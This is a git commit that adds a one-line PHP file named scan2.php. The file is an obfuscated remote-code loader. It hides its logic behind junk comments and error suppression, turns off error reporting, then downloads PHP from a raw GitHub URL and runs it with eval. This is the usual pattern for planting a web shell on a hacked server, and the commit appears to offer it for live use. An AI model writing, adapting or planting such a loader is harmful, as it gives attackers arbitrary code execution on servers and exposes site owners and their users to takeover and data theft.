44ae1a2eb4461a9f7fe43a6615dc2e08bd345601
Kiki <kikiamalia122000@gmail.com>
2025-02-07 16:45:13 +0700

    Create scan2.php

---
+++ back/mati/kau/scan2.php
@@ -0,0 +1,1 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/kikiii88/sadboy/refs/heads/main/back/mati/kau/scan.php"))/******/ /*By ./JANGANOM*/?>
